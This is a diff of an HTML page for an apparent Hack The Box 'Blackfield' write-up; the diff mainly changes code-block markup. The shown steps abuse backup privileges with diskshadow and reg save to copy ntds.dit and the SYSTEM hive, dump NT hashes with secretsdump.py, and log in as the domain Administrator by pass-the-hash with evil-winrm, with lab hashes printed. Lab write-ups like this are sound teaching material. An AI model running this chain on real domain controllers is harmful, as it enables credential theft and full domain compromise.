+</figure><p>Now, I’ll copy these <code>.dll</code> modules, <code>copy.cmd</code>, and <code>script.txt</code> to Blackfield using the upload feature from <code>evil-winrm</code> at <code>C:\temp\</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «exploits» «10.10.14.169»
 </span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.192 -u svc_backup -H <span class="s1">&#39;9658d1d1dcd9250115e2205d9f48400d&#39;</span>
 </span></span><span class="line"><span class="cl">Evil-WinRM shell v2.3
 </span></span><span class="line"><span class="cl">
@@ -344,9 +365,10 @@
 </span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; upload copy.cmd
 </span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
 </span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; upload script.txt
-</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
-</span></span></code></pre></div><p>After that, I can run <code>diskshadow</code> with the <code>/s</code> option, then I can supply the created <code>script.txt</code> as the command sequence.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; diskshadow /s script.txt
+</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...</span></span></code></pre>
+</figure><p>After that, I can run <code>diskshadow</code> with the <code>/s</code> option, then I can supply the created <code>script.txt</code> as the command sequence.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; diskshadow /s script.txt
 </span></span><span class="line"><span class="cl">Microsoft DiskShadow version 1.0
 </span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2013</span> Microsoft Corporation
 </span></span><span class="line"><span class="cl">On computer:  DC01,  10/4/2020 8:15:53 AM
@@ -384,12 +406,14 @@
 </span></span><span class="line"><span class="cl">Deleting shadow copy <span class="o">{</span>7c53326a-2617-450c-9d2d-5c381352aa45<span class="o">}</span> on volume <span class="se">\\</span>?<span class="se">\V</span>olume<span class="o">{</span>351b4712-0000-0000-0000-602200000000<span class="o">}</span><span class="se">\ </span>from provider <span class="o">{</span>b5946137-7b9f-4925-af80-51abd60b20d5<span class="o">}</span> <span class="o">[</span>Attributes: 0x00120019<span class="o">]</span>...
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Number of shadow copies deleted: <span class="m">1</span>
-</span></span><span class="line"><span class="cl">-&gt; reset
-</span></span></code></pre></div><p>Now that I have the <code>ntds.dit</code>, the last file that I need is the registry hive.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; reg save HKLM<span class="se">\S</span>YSTEM c:<span class="se">\t</span>emp<span class="se">\s</span>ystem
-</span></span><span class="line"><span class="cl">The operation completed successfully.
-</span></span></code></pre></div><p>I will download these files to my Kali using <code>evil-winrm</code> download feature.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; ls
+</span></span><span class="line"><span class="cl">-&gt; reset</span></span></code></pre>
+</figure><p>Now that I have the <code>ntds.dit</code>, the last file that I need is the registry hive.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; reg save HKLM<span class="se">\S</span>YSTEM c:<span class="se">\t</span>emp<span class="se">\s</span>ystem
+</span></span><span class="line"><span class="cl">The operation completed successfully.</span></span></code></pre>
+</figure><p>I will download these files to my Kali using <code>evil-winrm</code> download feature.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; ls
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\t</span>emp
@@ -401,10 +425,11 @@
 </span></span><span class="line"><span class="cl">-a----        10/4/2020   8:15 AM            <span class="m">140</span> script.txt
 </span></span><span class="line"><span class="cl">-a----        10/4/2020   8:14 AM          <span class="m">12288</span> SeBackupPrivilegeCmdLets.dll
 </span></span><span class="line"><span class="cl">-a----        10/4/2020   8:14 AM          <span class="m">16384</span> SeBackupPrivilegeUtils.dll
-</span></span><span class="line"><span class="cl">-a----        10/4/2020   8:21 AM       <span class="m">17547264</span> system
-</span></span></code></pre></div><h4 id="credentials-dumping">Credentials Dumping</h4>
+</span></span><span class="line"><span class="cl">-a----        10/4/2020   8:21 AM       <span class="m">17547264</span> system</span></span></code></pre>
+</figure><h4 id="credentials-dumping">Credentials Dumping</h4>
 <p>Now I can dump the NT hash from <code>ntds.dit</code> and <code>system</code> file using <code>secretsdump.py</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.169»
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.169»
 </span></span><span class="line"><span class="cl">$ secretsdump.py -system system -ntds ntds.dit LOCAL
 </span></span><span class="line"><span class="cl">Impacket v0.9.21 - Copyright <span class="m">2020</span> SecureAuth Corporation
 </span></span><span class="line"><span class="cl">
@@ -414,10 +439,11 @@
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> PEK <span class="c1"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Reading and decrypting hashes from ntds.dit
 </span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
-</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
-</span></span></code></pre></div><h4 id="winrm---administrator">WinRM - Administrator</h4>
+</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...</span></span></code></pre>
+</figure><h4 id="winrm---administrator">WinRM - Administrator</h4>
 <p>I can use the NT hash of administrator account to login using <code>evil-winrm</code> <em>pass-the-hash</em> feature.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.169»
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.169»
 </span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.192 -u administrator -H <span class="s1">&#39;184fb5e5178480be64824d4cd53b99ee&#39;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Evil-WinRM shell v2.3
@@ -425,8 +451,8 @@
 </span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; whoami
-</span></span><span class="line"><span class="cl">blackfield<span class="se">\a</span>dministrator
-</span></span></code></pre></div><div class="footnotes" role="doc-endnotes">
+</span></span><span class="line"><span class="cl">blackfield<span class="se">\a</span>dministrator</span></span></code></pre>
+</figure><div class="footnotes" role="doc-endnotes">
 <hr>
 <ol>
 <li id="fn:1">
